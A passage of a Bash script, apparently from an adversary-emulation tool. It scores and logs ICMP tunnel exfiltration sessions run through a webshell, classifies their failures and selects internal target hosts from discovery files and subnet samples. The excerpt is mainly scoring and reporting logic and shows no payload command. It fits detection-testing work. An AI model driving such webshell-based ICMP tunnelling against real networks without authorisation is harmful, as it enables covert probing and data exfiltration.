    local -n _out_likelihood="$7"
    local -n _out_reason="$8"
    local tls=0
    sent=$(safe_int "${sent}")
    avg_payload=$(safe_int "${avg_payload}")
    duration=$(safe_int "${duration}")
    large=$(safe_int "${large}")
    ratio=$(safe_int "${ratio}")
    pmax=$(safe_int "${pmax}")
    icmp_compute_tunnel_like_score "${sent}" "${ICMP_REPLIES_RECEIVED:-0}" "${duration}" \
        "${ICMP_PAYLOAD_SIZE_MIN:-0}" "${ICMP_PAYLOAD_SIZE_MAX:-0}" "${ICMP_INTERVAL_MS:-${ICMP_TUNNEL_LIKE_INTERVAL_MS}}"
    tls=$(safe_int "${ICMP_TUNNEL_LIKE_SCORE}")
    local received=$(safe_int "${ICMP_REPLIES_RECEIVED:-0}")
    if icmp_is_anomaly_only_mode "${ICMP_MODE_USED:-}"; then
        if (( large >= 80 && sent >= 80 && received >= 40 && ratio >= 70 )); then
            _out_likelihood="HIGH"
            _out_reason="payload_size_anomaly large_packets=${large} payload_avg=${avg_payload} ratio=${ratio}% actual=${sent} received=${received}"
        elif (( large >= 50 && sent >= 30 && received >= 15 )); then
            _out_likelihood="MEDIUM"
            _out_reason="payload_size_anomaly large_packets=${large} payload_avg=${avg_payload} ratio=${ratio}% actual=${sent} received=${received}"
        else
            _out_likelihood="LOW"
            _out_reason="payload_size_anomaly_only large_packets=${large} payload_avg=${avg_payload} not_tunnel_session"
        fi
        return 0
    fi
    if (( tls >= 70 && sent >= 80 && received > 0 && ICMP_BIDIRECTIONAL_RATIO >= 50 )); then
        _out_likelihood="HIGH"
        _out_reason="tunnel_like_score=${tls} sent=${sent} received=${received} bidir=${ICMP_BIDIRECTIONAL_RATIO}% duration=${duration}s interval_ms=${ICMP_INTERVAL_MS:-0}"
    elif (( tls >= 45 && sent >= 20 )); then
        _out_likelihood="MEDIUM"
        _out_reason="tunnel_like_score=${tls} sent=${sent} received=${ICMP_REPLIES_RECEIVED:-0} duration=${duration}s partial_tunnel_session"
    else
        _out_likelihood="LOW"
        _out_reason="tunnel_like_score=${tls} sent=${sent} ratio=${ICMP_BIDIRECTIONAL_RATIO:-0}% duration=${duration}s below_tunnel_threshold"
    fi
}

classify_icmp_tunnel_root_cause() {
    local sent="$1" received="$2"
    sent=$(safe_int "${sent}")
    received=$(safe_int "${received}")
    ICMP_FAILURE_CLASS=""
    ICMP_FAILURE_REASON=""
    if [[ "${HAS_ping:-false}" != true ]]; then
        ICMP_FAILURE_CLASS="ping_binary_missing"
        ICMP_FAILURE_REASON="ping executable not found on webshell host"
        ICMP_BINARY_FOUND="no"
        ICMP_TUNNEL_RESULT="failed"
        return 0
    fi
    ICMP_BINARY_FOUND="yes"
    if [[ -n "${ICMP_EXEC_FAILURE_EXIT_CODE}" && "${ICMP_EXEC_FAILURE_EXIT_CODE}" == 127 ]]; then
        ICMP_FAILURE_CLASS="ping_binary_missing"
        ICMP_FAILURE_REASON="ping returned exit code 127"
        ICMP_TUNNEL_RESULT="failed"
        return 0
    fi
    if [[ "${WEBSHELL_LAST_HTTP_CODE:-000}" == 000 ]] && (( sent == 0 )); then
        ICMP_FAILURE_CLASS="webshell_failure"
        ICMP_FAILURE_REASON="webshell HTTP request failed or timed out"
        ICMP_TUNNEL_RESULT="failed"
        return 0
    fi
    if [[ -n "${ICMP_EXEC_FAILURE_STDERR}" ]] && [[ "${ICMP_EXEC_FAILURE_STDERR}" == *timeout* ]]; then
        ICMP_FAILURE_CLASS="http_timeout"
        ICMP_FAILURE_REASON="${ICMP_EXEC_FAILURE_STDERR}"
        ICMP_TUNNEL_RESULT="failed"
        return 0
    fi
    if [[ -n "${ICMP_EXEC_FAILURE_STDERR}" ]] && [[ "${ICMP_EXEC_FAILURE_STDERR}" == *permission* ]]; then
        ICMP_FAILURE_CLASS="permission_denied"
        ICMP_FAILURE_REASON="${ICMP_EXEC_FAILURE_STDERR}"
        ICMP_TUNNEL_RESULT="failed"
        return 0
    fi
    if (( sent == 0 )); then
        ICMP_FAILURE_CLASS="command_execution_failed"
        ICMP_FAILURE_REASON="${ICMP_SKIP_REASON:-ping command produced zero packets}"
        ICMP_TUNNEL_RESULT="command_execution_failed"
        return 0
    fi
    if (( received == 0 )); then
        ICMP_FAILURE_CLASS="target_unresponsive"
        ICMP_FAILURE_REASON="target did not respond to ICMP echo (${ICMP_IMMUTABLE_TARGET:-n/a})"
        ICMP_TUNNEL_RESULT="target_unresponsive"
        return 0
    fi
    if [[ "${ICMP_PROBE_RESULT:-}" == parser_failed ]]; then
        ICMP_FAILURE_CLASS="parsing_failure"
        ICMP_FAILURE_REASON="ping output could not be parsed"
        return 0
    fi
    ICMP_FAILURE_CLASS=""
    ICMP_FAILURE_REASON=""
    if [[ "${ICMP_MODE_USED:-}" == tunnel-like-session ]]; then
        icmp_resolve_tunnel_like_session_result "${sent}" "${received}" "${ICMP_TUNNEL_LIKE_SCORE:-0}" "${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    else
        ICMP_TUNNEL_RESULT="success"
    fi
}

icmp_compute_evidence_quality() {
    local sent="$1" avg="$2" ratio="$3" duration="$4"
    sent=$(safe_int "${sent}")
    avg=$(safe_int "${avg}")
    ratio=$(safe_int "${ratio}")
    duration=$(safe_int "${duration}")
    if (( sent >= 80 && avg >= 1000 && ratio >= 80 && duration <= 120 )); then
        ICMP_EVIDENCE_QUALITY="high"
    elif (( sent >= 50 && avg >= 800 )); then
        ICMP_EVIDENCE_QUALITY="medium"
    else
        ICMP_EVIDENCE_QUALITY="low"
    fi
}

icmp_build_final_snapshot() {
    local sent received likelihood reason
    if [[ "${ICMP_SNAP_COMMITTED}" == true ]]; then
        icmp_apply_burst_stats_snapshot
        return 0
    fi
    icmp_apply_burst_stats_snapshot 2>/dev/null || true
    sent=$(safe_int "${ICMP_PACKETS_ATTEMPTED:-0}")
    received=$(safe_int "${ICMP_REPLIES_RECEIVED:-0}")
    [[ -n "${ICMP_IMMUTABLE_TARGET}" ]] && ICMP_SELECTED_TARGET="${ICMP_IMMUTABLE_TARGET}"
    classify_icmp_tunnel_root_cause "${sent}" "${received}"
    if [[ "${ICMP_MODE_USED:-}" == tunnel-like-session ]]; then
        icmp_resolve_tunnel_like_session_result "${sent}" "${received}" "${ICMP_TUNNEL_LIKE_SCORE:-0}" "${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    fi
    if (( sent > 0 )); then
        _icmp_eval_detection_likelihood "${sent}" "${ICMP_PAYLOAD_SIZE_AVG:-0}" "${ICMP_TUNNEL_DURATION_ELAPSED:-0}" \
            "${ICMP_LARGE_PACKETS:-0}" "${ICMP_LARGE_PAYLOAD_RATIO:-0}" "${ICMP_PAYLOAD_SIZE_MAX:-0}" likelihood reason
        if (( $(icmp_likelihood_rank "${ICMP_DETECTION_WINDOW_LIKELIHOOD:-LOW}") > $(icmp_likelihood_rank "${likelihood}") )); then
            likelihood="${ICMP_DETECTION_WINDOW_LIKELIHOOD}"
            reason="${ICMP_DETECTION_REASON:-${reason}}"
        fi
        ICMP_DETECTION_LIKELIHOOD="${likelihood}"
        ICMP_DETECTION_WINDOW_LIKELIHOOD="${likelihood}"
        ICMP_DETECTION_REASON="${reason}"
        icmp_compute_evidence_quality "${sent}" "${ICMP_PAYLOAD_SIZE_AVG:-0}" "${ICMP_LARGE_PAYLOAD_RATIO:-0}" "${ICMP_TUNNEL_DURATION_ELAPSED:-0}"
        icmp_commit_burst_stats_snapshot
    else
        ICMP_DETECTION_LIKELIHOOD="LOW"
        ICMP_DETECTION_WINDOW_LIKELIHOOD="LOW"
        ICMP_DETECTION_REASON="${ICMP_FAILURE_REASON:-${ICMP_SKIP_REASON:-no_packets_sent}}"
        ICMP_EVIDENCE_QUALITY="low"
        ICMP_SNAP_COMMITTED=true
        ICMP_SNAP_DETECTION_LIKELIHOOD="LOW"
        ICMP_SNAP_DETECTION_WINDOW_LIKELIHOOD="LOW"
        ICMP_SNAP_DETECTION_REASON="${ICMP_DETECTION_REASON}"
        ICMP_SNAP_RESULT="${ICMP_TUNNEL_RESULT:-failed}"
        ICMP_SNAP_TARGET=$(icmp_format_log_target)
        ICMP_SNAP_COMMAND="${ICMP_COMMAND_EXECUTED:-n/a}"
        ICMP_SNAP_FAILURE_CLASS="${ICMP_FAILURE_CLASS:-}"
        ICMP_SNAP_FAILURE_REASON="${ICMP_FAILURE_REASON:-}"
    fi
    return 0
}

validate_icmp_final_state() {
    local window="${ICMP_SNAP_DETECTION_WINDOW_LIKELIHOOD:-LOW}" final="${ICMP_SNAP_DETECTION_LIKELIHOOD:-LOW}" stage="${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    local final_result="${ICMP_TUNNEL_FINAL_RESULT:-${ICMP_TUNNEL_RESULT:-unknown}}"
    local stage_result="${ICMP_TUNNEL_STAGE_RESULT:-${ICMP_TUNNEL_STAGE_STATUS:-unknown}}"
    icmp_apply_burst_stats_snapshot || return 1
    window="${ICMP_SNAP_DETECTION_WINDOW_LIKELIHOOD:-LOW}"
    final="${ICMP_SNAP_DETECTION_LIKELIHOOD:-LOW}"
    stage="${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    final_result="${ICMP_TUNNEL_FINAL_RESULT:-${ICMP_TUNNEL_RESULT:-unknown}}"
    stage_result="${ICMP_TUNNEL_STAGE_RESULT:-${ICMP_TUNNEL_STAGE_STATUS:-unknown}}"
    if [[ "${window}" != "${final}" || "${final}" != "${stage}" ]]; then
        icmp_tunnel_log_both "ERROR: ICMP_STATE_INCONSISTENCY window=${window} final=${final} stage=${stage}"
        return 1
    fi
    if [[ "${ICMP_MODE_USED:-}" == tunnel-like-session ]]; then
        case "${final_result}" in
            success) [[ "${stage_result}" == success || "${stage_result}" == Success ]] || {
                icmp_tunnel_log_both "ERROR: ICMP_RESULT_MISMATCH final=${final_result} stage=${stage_result}"
                return 1
            } ;;
            partial) [[ "${stage_result}" == partial || "${stage_result}" == Partial ]] || {
                icmp_tunnel_log_both "ERROR: ICMP_RESULT_MISMATCH final=${final_result} stage=${stage_result}"
                return 1
            } ;;
            failed) [[ "${stage_result}" == failed || "${stage_result}" == Failed ]] || {
                icmp_tunnel_log_both "ERROR: ICMP_RESULT_MISMATCH final=${final_result} stage=${stage_result}"
                return 1
            } ;;
        esac
        if [[ "${final_result}" == success && "${stage}" != HIGH ]]; then
            icmp_tunnel_log_both "ERROR: ICMP_SUCCESS_WITHOUT_HIGH_LIKELIHOOD likelihood=${stage}"
            return 1
        fi
    fi
    return 0
}

icmp_commit_burst_stats_snapshot() {
    local sent="${ICMP_PACKETS_ATTEMPTED:-0}" received="${ICMP_REPLIES_RECEIVED:-0}"
    sent=$(safe_int "${sent}")
    received=$(safe_int "${received}")
    (( sent < 1 )) && return 1
    ICMP_SNAP_COMMITTED=true
    ICMP_SNAP_BASELINE_PACKETS=$(safe_int "${ICMP_BASELINE_PACKETS:-0}")
    ICMP_SNAP_LARGE_PACKETS=$(safe_int "${ICMP_LARGE_PACKETS:-0}")
    ICMP_SNAP_LARGE_PAYLOAD_RATIO=$(safe_int "${ICMP_LARGE_PAYLOAD_RATIO:-0}")
    ICMP_SNAP_PACKETS_SENT="${sent}"
    ICMP_SNAP_PACKETS_RECEIVED="${received}"
    ICMP_SNAP_PAYLOAD_SIZE_MIN=$(safe_int "${ICMP_PAYLOAD_SIZE_MIN:-0}")
    ICMP_SNAP_PAYLOAD_SIZE_MAX=$(safe_int "${ICMP_PAYLOAD_SIZE_MAX:-0}")
    ICMP_SNAP_PAYLOAD_SIZE_AVG=$(safe_int "${ICMP_PAYLOAD_SIZE_AVG:-0}")
    ICMP_SNAP_DURATION_SECONDS=$(safe_int "${ICMP_TUNNEL_DURATION_ELAPSED:-0}")
    ICMP_SNAP_DETECTION_WINDOW_LIKELIHOOD="${ICMP_DETECTION_WINDOW_LIKELIHOOD:-LOW}"
    ICMP_SNAP_DETECTION_LIKELIHOOD="${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    ICMP_SNAP_DETECTION_REASON="${ICMP_DETECTION_REASON:-n/a}"
    ICMP_SNAP_RESULT="${ICMP_TUNNEL_RESULT:-unknown}"
    ICMP_SNAP_TARGET=$(icmp_format_log_target "${ICMP_IMMUTABLE_TARGET:-${ICMP_SELECTED_TARGET:-}}")
    ICMP_SNAP_COMMAND="${ICMP_COMMAND_EXECUTED:-n/a}"
    ICMP_SNAP_FAILURE_CLASS="${ICMP_FAILURE_CLASS:-}"
    ICMP_SNAP_FAILURE_REASON="${ICMP_FAILURE_REASON:-}"
    if (( $(icmp_likelihood_rank "${ICMP_SNAP_DETECTION_WINDOW_LIKELIHOOD}") > $(icmp_likelihood_rank "${ICMP_SNAP_DETECTION_LIKELIHOOD}") )); then
        ICMP_SNAP_DETECTION_LIKELIHOOD="${ICMP_SNAP_DETECTION_WINDOW_LIKELIHOOD}"
    fi
    return 0
}

icmp_apply_burst_stats_snapshot() {
    [[ "${ICMP_SNAP_COMMITTED}" != true ]] && return 1
    ICMP_BASELINE_PACKETS="${ICMP_SNAP_BASELINE_PACKETS}"
    ICMP_LARGE_PACKETS="${ICMP_SNAP_LARGE_PACKETS}"
    ICMP_LARGE_PAYLOAD_RATIO="${ICMP_SNAP_LARGE_PAYLOAD_RATIO}"
    ICMP_PACKETS_ATTEMPTED="${ICMP_SNAP_PACKETS_SENT}"
    ICMP_TOTAL_PACKETS="${ICMP_SNAP_PACKETS_SENT}"
    ICMP_REPLIES_RECEIVED="${ICMP_SNAP_PACKETS_RECEIVED}"
    ICMP_ECHO_COUNT="${ICMP_SNAP_PACKETS_RECEIVED}"
    ICMP_PAYLOAD_SIZE_MIN="${ICMP_SNAP_PAYLOAD_SIZE_MIN}"
    ICMP_PAYLOAD_SIZE_MAX="${ICMP_SNAP_PAYLOAD_SIZE_MAX}"
    ICMP_PAYLOAD_SIZE_AVG="${ICMP_SNAP_PAYLOAD_SIZE_AVG}"
    ICMP_TUNNEL_DURATION_ELAPSED="${ICMP_SNAP_DURATION_SECONDS}"
    ICMP_DETECTION_WINDOW_LIKELIHOOD="${ICMP_SNAP_DETECTION_WINDOW_LIKELIHOOD}"
    ICMP_DETECTION_LIKELIHOOD="${ICMP_SNAP_DETECTION_LIKELIHOOD}"
    ICMP_DETECTION_REASON="${ICMP_SNAP_DETECTION_REASON}"
    [[ -n "${ICMP_SNAP_RESULT}" && "${ICMP_SNAP_RESULT}" != unknown ]] && ICMP_TUNNEL_RESULT="${ICMP_SNAP_RESULT}"
    [[ -n "${ICMP_SNAP_TARGET}" && "${ICMP_SNAP_TARGET}" != n/a ]] && ICMP_SELECTED_TARGET="${ICMP_SNAP_TARGET}" && ICMP_IMMUTABLE_TARGET="${ICMP_SNAP_TARGET}"
    [[ -n "${ICMP_SNAP_COMMAND}" && "${ICMP_SNAP_COMMAND}" != n/a ]] && ICMP_COMMAND_EXECUTED="${ICMP_SNAP_COMMAND}"
    [[ -n "${ICMP_SNAP_FAILURE_CLASS}" ]] && ICMP_FAILURE_CLASS="${ICMP_SNAP_FAILURE_CLASS}"
    [[ -n "${ICMP_SNAP_FAILURE_REASON}" ]] && ICMP_FAILURE_REASON="${ICMP_SNAP_FAILURE_REASON}"
    return 0
}

icmp_finalize_detection_likelihood() {
    icmp_apply_burst_stats_snapshot || true
}

apply_icmp_tunnel_burst_stats_from_output() {
    local out="$1" line="" field=""
    line=$(printf '%s\n' "${out}" | tr -d '\r' | grep 'ICMP_TUNNEL_STATS' | tail -n1 || true)
    [[ -z "${line}" ]] && return 1
    field=$(dns_stats_field_from_line "${line}" planned_packets)
    [[ -n "${field}" ]] && ICMP_PACKETS_PLANNED=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" attempted_packets)
    [[ -n "${field}" ]] && ICMP_PACKETS_ATTEMPTED_PLANNED=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" actual_packets)
    if [[ -n "${field}" ]]; then
        ICMP_PACKETS_ATTEMPTED=$(safe_int "${field}")
    else
        ICMP_PACKETS_ATTEMPTED=$(safe_int "$(dns_stats_field_from_line "${line}" attempted)")
    fi
    ICMP_BASELINE_PACKETS=$(safe_int "$(dns_stats_field_from_line "${line}" baseline)")
    ICMP_LARGE_PACKETS=$(safe_int "$(dns_stats_field_from_line "${line}" large)")
    ICMP_REPLIES_RECEIVED=$(safe_int "$(dns_stats_field_from_line "${line}" replies)")
    ICMP_TOTAL_PACKETS="${ICMP_PACKETS_ATTEMPTED}"
    ICMP_ECHO_COUNT="${ICMP_REPLIES_RECEIVED}"
    ICMP_PAYLOAD_SIZE_AVG=$(safe_int "$(dns_stats_field_from_line "${line}" payload_avg)")
    field=$(dns_stats_field_from_line "${line}" payload)
    (( ICMP_PAYLOAD_SIZE_AVG < 1 )) && ICMP_PAYLOAD_SIZE_AVG=$(safe_int "${field}")
    ICMP_PAYLOAD_SIZE_MIN=$(safe_int "$(dns_stats_field_from_line "${line}" payload_min)")
    ICMP_PAYLOAD_SIZE_MAX=$(safe_int "$(dns_stats_field_from_line "${line}" payload_max)")
    ICMP_LARGE_PAYLOAD_RATIO=$(safe_int "$(dns_stats_field_from_line "${line}" large_payload_ratio)")
    ICMP_TUNNEL_DURATION_ELAPSED=$(safe_int "$(dns_stats_field_from_line "${line}" duration_seconds)")
    field=$(dns_stats_field_from_line "${line}" loss_pct)
    [[ -n "${field}" ]] && ICMP_OVERALL_LOSS=$(safe_int "${field}") && ICMP_PACKET_LOSS="${ICMP_OVERALL_LOSS}"
    field=$(dns_stats_field_from_line "${line}" bytes)
    [[ -n "${field}" ]] && ICMP_ESTIMATED_BYTES=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" detection_likelihood)
    [[ -n "${field}" ]] && ICMP_DETECTION_WINDOW_LIKELIHOOD="${field^^}"
    field=$(dns_stats_field_from_line "${line}" detection_reason)
    [[ -n "${field}" ]] && ICMP_DETECTION_REASON="${field}"
    field=$(dns_stats_field_from_line "${line}" result)
    [[ -n "${field}" ]] && ICMP_TUNNEL_FINAL_RESULT="${field}" && ICMP_TUNNEL_RESULT="${field}"
    field=$(dns_stats_field_from_line "${line}" tunnel_like_score)
    [[ -n "${field}" ]] && ICMP_TUNNEL_LIKE_SCORE=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" interval_ms)
    [[ -n "${field}" ]] && ICMP_INTERVAL_MS=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" bidirectional_ratio)
    [[ -n "${field}" ]] && ICMP_BIDIRECTIONAL_RATIO=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" cmd)
    [[ -n "${field}" ]] && ICMP_COMMAND_EXECUTED="${field}"
    field=$(dns_stats_field_from_line "${line}" mode)
    [[ -n "${field}" ]] && ICMP_MODE_USED="${field}" && ICMP_PAYLOAD_MODE="${field}"
    field=$(dns_stats_field_from_line "${line}" target)
    if [[ -n "${field}" ]] && icmp_is_valid_ipv4_target "$(poc_extract_ipv4 "${field}")"; then
        ICMP_SELECTED_TARGET="$(poc_extract_ipv4 "${field}")"
    fi
    field=$(dns_stats_field_from_line "${line}" partial_packets_estimated)
    [[ -n "${field}" ]] && ICMP_PARTIAL_PACKETS_ESTIMATED=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" timeout_bursts)
    [[ -n "${field}" ]] && ICMP_TIMEOUT_BURSTS=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" successful_bursts)
    [[ -n "${field}" ]] && ICMP_SUCCESSFUL_BURSTS=$(safe_int "${field}")
    field=$(dns_stats_field_from_line "${line}" failed_bursts)
    [[ -n "${field}" ]] && ICMP_FAILED_BURSTS=$(safe_int "${field}")
    [[ -n "$(dns_stats_field_from_line "${line}" result)" ]] && ICMP_TUNNEL_STAGE_RESULT="$(dns_stats_field_from_line "${line}" result)"
    return 0
}

icmp_emit_execution_evidence() {
    icmp_apply_burst_stats_snapshot || true
    local summary_target
    summary_target=$(icmp_format_log_target)
    icmp_tunnel_log_both "ICMP_EXECUTION_EVIDENCE target=${summary_target} command=${ICMP_COMMAND_EXECUTED:-n/a} payload_size=${ICMP_PAYLOAD_SIZE_AVG:-0} packets_sent=${ICMP_PACKETS_ATTEMPTED:-0} packets_received=${ICMP_REPLIES_RECEIVED:-0} loss=${ICMP_OVERALL_LOSS:-${ICMP_PACKET_LOSS:-0}}% duration=${ICMP_TUNNEL_DURATION_ELAPSED:-0}s exit_code=${ICMP_EXEC_FAILURE_EXIT_CODE:-0} webshell_http_status=${WEBSHELL_LAST_HTTP_CODE:-000} stdout_summary=${ICMP_LAST_EXEC_STDOUT_SUMMARY:-n/a}"
}

icmp_emit_customer_summary() {
    icmp_apply_burst_stats_snapshot || true
    local summary_target exec_result evidence_q
    summary_target=$(icmp_format_log_target)
    exec_result="${ICMP_TUNNEL_FINAL_RESULT:-${ICMP_TUNNEL_RESULT:-unknown}}"
    [[ "${exec_result}" == success ]] && exec_result="SUCCESS" || exec_result="${exec_result^^}"
    evidence_q="${ICMP_EVIDENCE_QUALITY:-low}"
    evidence_q="${evidence_q^^}"
    icmp_tunnel_log_both "ICMP_TUNNEL_CUSTOMER_SUMMARY"
    icmp_tunnel_log_both "Target: ${summary_target}"
    icmp_tunnel_log_both "Traffic: ${ICMP_PACKETS_ATTEMPTED:-0} ICMP packets"
    icmp_tunnel_log_both "Average Payload: ${ICMP_PAYLOAD_SIZE_AVG:-0} bytes"
    icmp_tunnel_log_both "Large Payload Ratio: ${ICMP_LARGE_PAYLOAD_RATIO:-0}%"
    icmp_tunnel_log_both "Duration: ${ICMP_TUNNEL_DURATION_ELAPSED:-0} seconds"
    icmp_tunnel_log_both "Detection Likelihood: ${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    icmp_compute_detection_readiness "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_REPLIES_RECEIVED:-0}" "${ICMP_TUNNEL_LIKE_SCORE:-0}"
    icmp_tunnel_log_both "Detection Readiness: ${ICMP_DETECTION_READINESS}"
    icmp_tunnel_log_both "Expected Detection: ICMP Based Exfiltration (T1048.003)"
    icmp_tunnel_log_both "Execution Result: ${exec_result}"
    icmp_tunnel_log_both "Evidence Quality: ${evidence_q}"
}

icmp_emit_tunnel_final_summary() {
    [[ "${ICMP_FINAL_SUMMARY_EMITTED}" == true ]] && return 0
    icmp_apply_burst_stats_snapshot || true
    local summary_target failure_fields=""
    summary_target=$(icmp_format_log_target)
    if ! icmp_is_valid_ipv4_target "${summary_target}"; then
        icmp_tunnel_log_both "ICMP_TARGET_SELECTION_LOGIC_ERROR reason=invalid_final_summary_target value=${ICMP_SELECTED_TARGET:-n/a}"
        summary_target="n/a"
        if (( ICMP_PACKETS_ATTEMPTED > 0 )); then
            ICMP_TUNNEL_RESULT="target_selection_bug"
            ICMP_TUNNEL_STAGE_STATUS="failed"
        fi
    fi
    if [[ -n "${ICMP_FAILURE_CLASS}" ]]; then
        failure_fields=" failure_class=${ICMP_FAILURE_CLASS} reason=${ICMP_FAILURE_REASON:-n/a}"
    fi
    local summary_result="${ICMP_TUNNEL_FINAL_RESULT:-${ICMP_TUNNEL_RESULT:-unknown}}"
    icmp_compute_detection_readiness "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_REPLIES_RECEIVED:-0}" "${ICMP_TUNNEL_LIKE_SCORE:-0}"
    icmp_tunnel_log_both "Detection Readiness: ${ICMP_DETECTION_READINESS}"
    icmp_tunnel_log_both "ICMP_TUNNEL_FINAL_SUMMARY target=${summary_target} planned_packets=${ICMP_PACKETS_PLANNED:-0} attempted_packets=${ICMP_PACKETS_ATTEMPTED_PLANNED:-0} actual_packets=${ICMP_PACKETS_ATTEMPTED:-0} received_packets=${ICMP_REPLIES_RECEIVED:-0} partial_packets_estimated=${ICMP_PARTIAL_PACKETS_ESTIMATED:-0} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} successful_bursts=${ICMP_SUCCESSFUL_BURSTS:-0} failed_bursts=${ICMP_FAILED_BURSTS:-0} baseline_packets=${ICMP_BASELINE_PACKETS:-0} large_packets=${ICMP_LARGE_PACKETS:-0} total_packets_sent=${ICMP_PACKETS_ATTEMPTED:-0} total_packets_received=${ICMP_REPLIES_RECEIVED:-0} payload_size_min=${ICMP_PAYLOAD_SIZE_MIN:-0} payload_size_max=${ICMP_PAYLOAD_SIZE_MAX:-0} payload_size_avg=${ICMP_PAYLOAD_SIZE_AVG:-0} large_payload_ratio=${ICMP_LARGE_PAYLOAD_RATIO:-0}% duration_seconds=${ICMP_TUNNEL_DURATION_ELAPSED:-0} session_duration=${ICMP_SESSION_DURATION:-${ICMP_TUNNEL_DURATION_ELAPSED:-0}} interval_ms=${ICMP_INTERVAL_MS:-0} bidirectional_ratio=${ICMP_BIDIRECTIONAL_RATIO:-0}% tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE:-0} detection_likelihood=${ICMP_DETECTION_LIKELIHOOD:-LOW} detection_readiness=${ICMP_DETECTION_READINESS} root_cause=${ICMP_LAST_ROOT_CAUSE:-none} webshell_method=${ICMP_LAST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}} effective_timeout_sec=${ICMP_LAST_EFFECTIVE_TIMEOUT_SEC:-0} curl_max_time=${ICMP_LAST_CURL_MAX_TIME:-0} fallback_modes=${ICMP_FALLBACK_MODES_ATTEMPTED:-none} result=${summary_result}${failure_fields} detail=${ICMP_DETECTION_REASON:-n/a}"
    ICMP_FINAL_SUMMARY_EMITTED=true
}

icmp_normalize_probe_result() {
    case "${1:-}" in
        alive|target_unresponsive|parser_failed) printf '%s' "${1}" ;;
        *) printf 'command_failed' ;;
    esac
}

icmp_ip_list_from_discovery_file() {
    local f="$1" line="" ip="" out=""
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        ip=$(poc_extract_ipv4 "${line}")
        [[ -z "${ip}" ]] && continue
        out=$(printf '%s\n%s' "${out}" "${ip}")
    done < <(collect_hosts_from_remote_file "${f}")
    printf '%s\n' "${out}" | awk 'NF' | sort -u
}

icmp_ip_in_discovery_file() {
    local ip="$1" f="$2" found=""
    [[ -z "${ip}" || -z "${f}" ]] && return 1
    found=$(icmp_ip_list_from_discovery_file "${f}" | grep -Fx "${ip}" || true)
    [[ -n "${found}" ]]
}

icmp_resolve_host_priority() {
    local ip="$1"
    [[ -z "${ip}" ]] && { printf '6'; return 0; }
    if icmp_ip_in_discovery_file "${ip}" "ssh_hosts.txt"; then
        printf '1'
        return 0
    fi
    for f in http_targets.txt https_targets.txt reachable_http_targets.txt reachable_https_targets.txt \
             usable_http_targets.txt usable_https_targets.txt; do
        if icmp_ip_in_discovery_file "${ip}" "${f}"; then
            printf '2'
            return 0
        fi
    done
    if icmp_ip_in_discovery_file "${ip}" "dns_hosts.txt"; then
        printf '3'
        return 0
    fi
    printf '4'
}

icmp_resolve_host_source_label() {
    local ip="$1" f="" pri=""
    pri=$(icmp_resolve_host_priority "${ip}")
    case "${pri}" in
        1) printf 'ssh_hosts.txt' ;;
        2)
            for f in http_targets.txt https_targets.txt reachable_http_targets.txt reachable_https_targets.txt; do
                if icmp_ip_in_discovery_file "${ip}" "${f}"; then
                    printf '%s' "${f}"
                    return 0
                fi
            done
            printf 'http_targets.txt'
            ;;
        3) printf 'dns_hosts.txt' ;;
        4) printf 'discovery_other' ;;
        5) printf 'subnet_sweep' ;;
        *) printf 'subnet_sample' ;;
    esac
}

icmp_extract_ips_from_discovery_file() {
    local f="$1" raw="" line="" ip=""
    raw=$(collect_hosts_from_remote_file "${f}")
    if [[ -z "${raw}" ]]; then
        raw=$(get_local_hosts "${f}" 2>/dev/null || true)
    fi
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        ip=$(poc_extract_ipv4 "${line}")
        [[ -n "${ip}" ]] && printf '%s\n' "${ip}"
    done <<< "${raw}"
}

icmp_discovery_files_have_ips() {
    local f="" ip=""
    for f in http_targets.txt https_targets.txt reachable_http_targets.txt reachable_https_targets.txt \
             ssh_hosts.txt dns_hosts.txt usable_http_targets.txt usable_https_targets.txt; do
        ip=$(icmp_extract_ips_from_discovery_file "${f}" | awk 'NF' | head -n1)
        [[ -n "${ip}" ]] && return 0
    done
    return 1
}

collect_icmp_tunnel_discovery_ips() {
    local merged="" f ip
    local -a files=(
        http_targets.txt
        https_targets.txt
        reachable_http_targets.txt
        reachable_https_targets.txt
        ssh_hosts.txt
        dns_hosts.txt
        usable_http_targets.txt
        usable_https_targets.txt
    )
    for f in "${files[@]}"; do
        while IFS= read -r ip; do
            [[ -z "${ip}" ]] && continue
            merged=$(printf '%s\n%s' "${merged}" "${ip}")
        done < <(icmp_extract_ips_from_discovery_file "${f}")
    done
    printf '%s\n' "${merged}" | awk 'NF' | sort -u
}

collect_icmp_subnet_sweep_ips() {
    local merged="" f ip line
    for f in ping_responsive_hosts.txt alive_hosts.txt icmp_hosts.txt; do
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            ip=$(poc_extract_ipv4 "${line}")
            [[ -z "${ip}" ]] && continue
            icmp_host_allowed_for_probe "${ip}" || continue
            merged=$(printf '%s\n%s' "${merged}" "${ip}")
        done < <(collect_hosts_from_remote_file "${f}")
    done
    printf '%s\n' "${merged}" | awk 'NF' | sort -u
}

icmp_subnet_sample_hosts() {
    local i out=""
    [[ -z "${NETWORK_PREFIX}" ]] && return 0
    for i in 1 10 20 30 40 50 100 150 200 254; do
        out=$(printf '%s\n%s' "${out}" "${NETWORK_PREFIX}.${i}")
    done
    printf '%s\n' "${out}" | awk 'NF'
}

icmp_log_discovery_candidate_summary() {
    local discovery_ips="$1" ssh_n=0 http_n=0 dns_n=0 other_n=0 ip pri
    while IFS= read -r ip; do
        [[ -z "${ip}" ]] && continue
